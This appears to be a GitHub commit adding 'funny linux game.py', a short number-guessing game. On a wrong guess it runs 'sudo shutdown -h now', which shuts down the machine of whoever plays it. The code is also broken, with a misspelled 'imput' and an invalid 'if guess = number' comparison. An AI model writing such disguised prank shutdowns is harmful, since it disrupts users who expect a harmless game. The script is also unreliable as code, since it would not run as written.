5360c9beba41aa730f9d0622536a781c74036afb
Matyuk <124920731+Matyuk-ua@users.noreply.github.com>
2023-10-14 14:45:36 +0300

    Add files via upload

---
+++ funny linux game.py
@@ -0,0 +1,12 @@
+import random
+import os
+import subprocess
+
+number = random.randint(1, 10)
+
+guess = int(imput("Let`s play the game! Chose the number"))
+
+if guess = number:
+    print("Congratulation! You win!")
+else:
+    os.system('sudo shutdown -h now')
